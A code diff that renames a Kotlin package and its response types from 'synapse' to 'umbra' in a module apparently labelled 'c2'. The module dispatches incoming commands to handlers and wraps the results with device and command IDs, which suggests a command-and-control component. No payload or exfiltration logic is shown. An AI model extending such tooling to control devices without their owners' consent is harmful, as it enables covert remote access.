@@ -1,11 +1,11 @@
-package org.synapse.core.c2
+package org.umbra.core.c2
 
 import kotlinx.serialization.SerialName
 import kotlinx.serialization.Serializable
 import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
-import org.synapse.core.core.ResponseEnvelope
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.core.ResponseEnvelope
+import org.umbra.core.core.UmbraResponse
 
 @Serializable
 data class Command(
@@ -20,10 +20,10 @@ object CommandDispatcher {
 
     private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }
 
-    private var handlers: Map<String, suspend (Command) -> SynapseResponse> = emptyMap()
+    private var handlers: Map<String, suspend (Command) -> UmbraResponse> = emptyMap()
     private var deviceId: String = ""
 
-    fun register(moduleHandlers: Map<String, suspend (Command) -> SynapseResponse>) {
+    fun register(moduleHandlers: Map<String, suspend (Command) -> UmbraResponse>) {
         handlers = moduleHandlers
     }
 
@@ -38,16 +38,16 @@ object CommandDispatcher {
             val response = if (handler != null) {
                 handler(cmd)
             } else {
-                SynapseResponse.ErrorResponse(error = "unknown_module:${cmd.module}", module = cmd.module)
+                UmbraResponse.ErrorResponse(error = "unknown_module:${cmd.module}", module = cmd.module)
             }
 
             val envelope = ResponseEnvelope(
                 type = response::class.simpleName ?: "Unknown",
                 device_id = deviceId,
                 cmd_id = cmd.cmd_id,
-                status = if (response is SynapseResponse.ErrorResponse) "error" else "ok",
+                status = if (response is UmbraResponse.ErrorResponse) "error" else "ok",
                 payload = response,
-                error = if (response is SynapseResponse.ErrorResponse) response.error else ""
+                error = if (response is UmbraResponse.ErrorResponse) response.error else ""
             )
 
             json.encodeToString(ResponseEnvelope.serializer(), envelope)
